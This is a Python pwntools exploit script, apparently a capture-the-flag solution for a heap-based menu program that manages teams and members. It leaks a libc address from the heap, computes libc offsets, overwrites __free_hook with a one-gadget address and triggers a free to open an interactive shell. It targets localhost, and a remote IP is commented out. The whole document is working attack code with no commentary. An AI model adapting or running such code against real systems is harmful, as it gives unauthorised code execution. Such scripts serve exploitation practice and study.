#!/usr/bin/env python2

from IPython import embed
from pwn import *

#p = remote('13.124.157.141', 31337)
p = remote('127.0.0.1', 7122)

def menu():
	p.recvuntil('Exit')

def create_t(n, s):
	menu()
	p.sendline('1')
	p.recvuntil('length :')
	p.sendline(str(n))
	p.recvuntil('Description :')
	p.sendline(s)

def delete_t(n):
	menu()
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(n))

def manage_t(n):
	menu()
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(n))

def list_t():
	menu()
	p.sendline('4')
	return p.recvuntil('1. Create Team', drop=True)

def mem_menu():
	p.recvuntil('Return')

def add_mem(n, name, des):
	mem_menu()
	p.sendline('1')
	p.recvuntil('t :')
	p.sendline(str(n))
	for i in range(n):
		p.recvuntil('Name :')
		p.sendline(name[i])
		p.recvuntil('Description :')
		p.sendline(des[i])

def del_mem(n):
	mem_menu()
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(n))

def list_mem():
	mem_menu()
	p.sendline('3')
	return p.recvuntil('1. Add Member', drop=True)

def manage_mem(n, s):
	mem_menu()
	p.sendline('4')
	p.recvuntil('Index :')
	p.sendline(str(n))
	p.recvuntil('Description :')
	p.sendline(s)

def ret():
	mem_menu()
	p.sendline('5')



create_t(32, 'aaaa')
manage_t(0)
N = 20
add_mem(N, ['A'*90]*N, ['D'*90]*N)
print list_mem()
add_mem(-N, [], [])
ret()

create_t(32, '')
p.sendline('4')
p.recvuntil('Team 1')
p.recvuntil('Description : ')
addr = p.recvuntil('Size', drop=True)

main_arena = u64(addr.ljust(8, '\x00'))-234
libc = main_arena - 0x3c4b20
sleep = libc + 0xaef80
__malloc_hook = libc + 0x1af768+0x2153a8
__free_hook = libc + 0x1b08b0+0x215ef8
one_gadget = libc + 0x4526a
print hex(one_gadget)

#embed()

i = 10
create_t(32, p64(__free_hook))
manage_t(0)
#manage_mem(i, '\xaa'*98)
#manage_mem(i, p64(sleep))
#embed()
#ret()
#create_t(1000, 'Q')

manage_mem(i, p64(one_gadget))
ret()
embed()
delete_t(0)

#print list_t()
p.interactive()


#create_t(200, 'b'*190)
#manage_t(0)
#print list_mem()





